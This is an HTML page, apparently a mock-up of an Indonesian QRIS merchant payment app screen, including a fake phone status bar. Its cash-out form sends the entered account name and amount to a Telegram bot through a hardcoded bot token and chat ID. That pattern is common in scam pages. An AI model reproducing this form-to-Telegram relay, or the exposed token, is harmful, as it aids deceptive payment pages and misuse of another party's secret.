<html lang="en">
 <head>
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1" name="viewport" />
  <title>QRIS Merchant</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    body {
      font-family: "Poppins", sans-serif;
    }
    .modal {
      background-color: rgba(0, 0, 0, 0.6);
    }
  </style>
 </head>
 <body class="bg-[#1E1E1E] text-gray-300 min-h-screen">
  <!-- Top bar -->
  <div class="bg-[#147373] relative">
   <div class="flex justify-between items-center px-4 pt-3 pb-2">
    <div class="flex items-center space-x-3">
     <span class="text-white text-sm font-semibold cursor-pointer">
      <i class="fas fa-arrow-left"></i>
     </span>
     <h1 class="text-white font-semibold text-lg">QRIS Merchant</h1>
    </div>
    <div class="flex items-center space-x-2 text-white text-xs font-semibold">
     <span>22:00</span>
     <i class="far fa-clock"></i>
     <i class="fas fa-signal"></i>
     <i class="fas fa-signal"></i>
     <i class="fas fa-signal"></i>
     <div class="border border-white rounded-md px-1 text-[10px] font-semibold">39</div>
    </div>
    <div class="text-white text-xl cursor-pointer">
     <i class="fas fa-ellipsis-v"></i>
    </div>
   </div>
   <div class="h-8 w-full bg-[#147373] absolute bottom-0 left-0 rounded-t-3xl"></div>
  </div>

  <main class="px-4 pt-6 space-y-5">
   <!-- QR Card -->
   <div class="bg-[#222222] rounded-xl p-5 relative max-w-md mx-auto">
    <div class="flex justify-center mb-2">
     <img
      id="qrisImage"
      alt="QR code"
      class="w-24 h-24 cursor-pointer"
      src="https://fajar2943.wordpress.com/wp-content/uploads/2025/07/wp-17514824249573467361265887279643.jpg"
      onclick="openQRModal()"
     />
    </div>
    <p class="text-center text-gray-500 text-sm mb-5">Klik untuk memperbesar</p>
    <p class="font-semibold text-gray-400 mb-1">Metode QRIS</p>
    <p class="text-2xl font-bold text-white mb-2">Hallo</p>
    <button aria-label="Print button" class="absolute bottom-5 right-5 bg-[#147373] p-3 rounded-full text-white">
     <i class="fas fa-print"></i>
    </button>
   </div>

   <!-- Menu items -->
   <div class="space-y-4 max-w-md mx-auto">
    <a href="#" class="w-full flex items-center space-x-4 bg-[#222222] rounded-xl p-4 text-left no-underline">
     <div class="text-[#CFF6F6] text-2xl flex-shrink-0"><i class="fas fa-store"></i></div>
     <div class="flex-1">
      <p class="font-semibold text-white text-base">QRIS Merchant</p>
      <p class="text-gray-400 text-sm">Bikin QR langsung dengan nominal</p>
     </div>
     <div class="text-gray-400 text-lg"><i class="fas fa-chevron-right"></i></div>
    </a>

    <a href="#" class="w-full flex items-center space-x-4 bg-[#222222] rounded-xl p-4 text-left no-underline">
     <div class="text-[#CFF6F6] text-2xl flex-shrink-0"><i class="fas fa-exchange-alt"></i></div>
     <div class="flex-1">
      <p class="font-semibold text-white text-base">Mutasi QRIS</p>
      <p class="text-gray-400 text-sm">Cek pembayaran dari Customermu.</p>
     </div>
     <div class="text-gray-400 text-lg"><i class="fas fa-chevron-right"></i></div>
    </a>

    <!-- Pencairan QRIS tanpa href, pakai modal -->
    <button onclick="document.getElementById('modal').classList.remove('hidden')" class="w-full flex items-center space-x-4 bg-[#222222] rounded-xl p-4 text-left">
     <div class="text-[#CFF6F6] text-2xl flex-shrink-0"><i class="fas fa-money-check-alt"></i></div>
     <div class="flex-1">
      <p class="font-semibold text-white text-base">Pencairan QRIS</p>
      <p class="text-gray-400 text-sm">Cairkan QRIS mu ke Saldo Akun.</p>
     </div>
     <div class="text-gray-400 text-lg"><i class="fas fa-chevron-right"></i></div>
    </button>
   </div>
  </main>

  <!-- Modal Pencairan QRIS -->
  <div id="modal" class="hidden fixed inset-0 modal flex items-center justify-center z-50">
   <div class="bg-[#1E1E1E] p-6 rounded-xl shadow-lg w-11/12 max-w-md border border-gray-700">
    <h2 class="text-white text-xl font-semibold mb-4">Pencairan QRIS</h2>
    <label class="block mb-2 text-gray-400">Nama Akun</label>
    <input id="nama" type="text" class="w-full mb-4 p-2 rounded bg-[#2A2A2A] text-white border border-gray-600" />
    <label class="block mb-2 text-gray-400">Nominal</label>
    <input id="nominal" type="number" class="w-full mb-4 p-2 rounded bg-[#2A2A2A] text-white border border-gray-600" />
    <div class="flex justify-end space-x-3">
     <button onclick="document.getElementById('modal').classList.add('hidden')" class="px-4 py-2 bg-gray-600 text-white rounded">Batal</button>
     <button onclick="kirimTelegram()" class="px-4 py-2 bg-[#147373] text-white rounded">Kirim</button>
    </div>
   </div>
  </div>

  <!-- Modal Zoom Gambar QR -->
  <div id="qrModal" class="hidden fixed inset-0 modal z-50 flex items-center justify-center">
   <div class="relative bg-black rounded-lg p-4 max-w-md w-11/12">
    <button onclick="closeQRModal()" class="absolute top-2 right-3 text-white text-2xl">&times;</button>
    <img src="https://fajar2943.wordpress.com/wp-content/uploads/2025/07/wp-17514822931144020245648378941613.jpg" class="w-full rounded-lg" alt="QR Besar" />
   </div>
  </div>

  <script>
    function openQRModal() {
      document.getElementById("qrModal").classList.remove("hidden");
    }

    function closeQRModal() {
      document.getElementById("qrModal").classList.add("hidden");
    }

    function kirimTelegram() {
      const nama = document.getElementById('nama').value.trim();
      const nominal = document.getElementById('nominal').value.trim();
      const botToken = '7595913044:AAGzpwrBZ3sLvrfnpKBBuULwAbFNqPoRl5k'; // Ganti dengan token bot kamu
      const chatId = '7989973630'; // Ganti dengan chat ID tujuan

      if (!nama || !nominal) {
        alert("Isi semua data terlebih dahulu.");
        return;
      }

      const pesan = `ðŸ§¾ *Pencairan QRIS*\nðŸ‘¤ Nama Akun: ${nama}\nðŸ’° Nominal: Rp ${nominal}`;
      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`;

      fetch(url)
        .then(response => {
          if (response.ok) {
            alert("Berhasil dikirim ke Telegram!");
            document.getElementById('modal').classList.add('hidden');
            document.getElementById('nama').value = '';
            document.getElementById('nominal').value = '';
          } else {
            alert("Gagal mengirim ke Telegram.");
          }
        })
        .catch(error => {
          console.error("Error:", error);
          alert("Terjadi kesalahan.");
        });
    }
  </script>
 </body>
</html>
